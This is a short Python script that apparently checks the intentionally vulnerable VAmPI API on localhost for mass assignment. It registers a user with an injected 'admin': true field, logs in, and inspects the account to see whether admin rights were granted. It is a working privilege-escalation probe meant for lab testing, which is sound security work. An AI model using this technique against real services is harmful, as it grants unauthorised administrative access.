"""Manual mass assignment check against VAmPI.

Registers a new user with an extra "admin": true field and checks
whether the server accepts it.
"""

import random

import requests

BASE_URL = "http://localhost:5000"
username = f"attacker{random.randint(1000, 9999)}"

# 1. Register a normal user, but add a field the client should never control
register = requests.post(
    f"{BASE_URL}/users/v1/register",
    json={
        "username": username,
        "password": "pass123",
        "email": f"{username}@mail.com",
        "admin": True,
    },
)
print("Register status:", register.status_code)
print("Register response:", register.json())

# 2. Log in as the new user
login = requests.post(
    f"{BASE_URL}/users/v1/login",
    json={"username": username, "password": "pass123"},
)
token = login.json()["auth_token"]
headers = {"Authorization": f"Bearer {token}"}

# 3. Check the account's details: did we become an admin?
me = requests.get(f"{BASE_URL}/me", headers=headers)
print("Me status:", me.status_code)
print("Me response:", me.json())